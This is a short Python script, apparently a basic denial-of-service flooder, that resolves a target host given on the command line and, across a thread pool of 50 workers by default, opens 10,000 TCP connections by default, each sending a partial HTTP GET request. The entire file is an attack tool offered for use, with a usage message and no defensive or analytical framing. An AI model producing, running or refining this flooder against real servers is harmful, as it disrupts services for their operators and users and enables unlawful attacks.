import socket, sys, getopt, concurrent.futures

def flooder(target, port):
    try:
        address = socket.gethostbyname(target)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.gaierror:
        sys.exit()

    except ConnectionAbortedError:
        print('A connection has been broken off')
        sys.exit()

    except socket.error:
        print('No connection')
        sys.exit()

    else:
        s.connect((address, port))
        s.send(b'GET / HTTP/1.1\r\n')
        print('Sent request to %s' % str(address))
def main(argv):
    opts, args = getopt.getopt(argv,'ht:p:w:r:',['target=','port=','workers=','range='])

    #default values
    target = None
    port = 80
    workers = 50
    num_of_req = 10000

    #define options
    for opt, arg in opts:
        if '-h' in opt:
            print('Usage: python3 main.py -t <target_without_http://> '
                  '-p <port> -w <number_of_workers> -r <number_of requests>')
            sys.exit()
        elif opt in ("-t", "--targer"):
            target = str(arg)
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ('-w', '--workers'):
            workers = int(arg)
        elif opt in ('-r', '--range'):
            num_of_req = int(arg)

    if not target:
        print('You have to select a target with flag -t')

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        for _ in range(num_of_req):
            executor.submit(flooder, target, port)

if __name__ == "__main__":
    main(sys.argv[1:])